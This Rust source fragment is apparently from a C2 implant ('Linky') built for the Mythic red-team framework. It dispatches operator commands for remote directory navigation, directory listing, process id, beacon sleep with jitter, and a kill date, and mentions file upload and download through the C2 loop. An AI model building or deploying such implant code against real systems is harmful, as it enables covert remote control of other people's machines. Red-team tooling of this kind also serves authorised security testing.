/// Cross-platform command dispatch for Linky implants.
///
/// Returns `Some(output)` if the command was handled here,
/// `None` if the caller's platform-specific code should handle it.
///
/// Note: "download" and "upload" are handled directly in run_c2_loop
/// because they require multi-step Mythic file transfer protocol.
pub fn dispatch_common(command: &str, parameters: &str) -> Option<String> {
    let output = match command {
        "cd" => {
            let path = crate::extract_param(parameters, "path");
            std::env::set_current_dir(&path)
                .map(|_| String::new())
                .unwrap_or_else(|e| format!("[-] {}", e))
        }
        "pwd" => std::env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|e| format!("[-] {}", e)),
        "ls" => {
            let path = crate::extract_param(parameters, "path");
            crate::list_dir(if path.is_empty() { "." } else { &path })
        }
        "pid" => std::process::id().to_string(),
        "sleep" => {
            let secs = crate::extract_param(parameters, "seconds");
            let jitter = crate::extract_param(parameters, "jitter");
            crate::handle_sleep_command(format!("{} {}", secs, jitter).trim())
        }
        "killdate" => {
            crate::handle_killdate_command(&crate::extract_param(parameters, "date"))
        }
        _ => return None,
    };
    Some(output)
}
